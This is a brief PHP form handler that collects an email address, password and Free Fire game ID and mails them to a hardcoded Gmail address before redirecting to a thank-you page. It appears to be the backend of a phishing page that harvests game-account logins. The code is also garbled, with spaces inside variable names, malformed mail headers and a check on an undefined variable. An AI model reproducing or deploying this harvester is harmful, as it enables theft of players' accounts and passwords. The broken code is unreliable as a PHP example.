<?php
//get data from form
$email address=$_post['email address'];
$password=$_post['password'];
$free fire id=$_post['free fire id'];

$to="shahadbro672@gmail.com";
$subject="mail from  website";
$txt="email address= ".$email address. "\r\n password=".$password."\r\n free fire id=" .$free fire id;
$headers= "form:noreply@"domain "\r\n".
"cc; someboadyelse@example.com";
 if($ email !=null){  
     mail($to,$subject,$txt,$headers);
}
//redirect
header("location:thank you.html");
?>




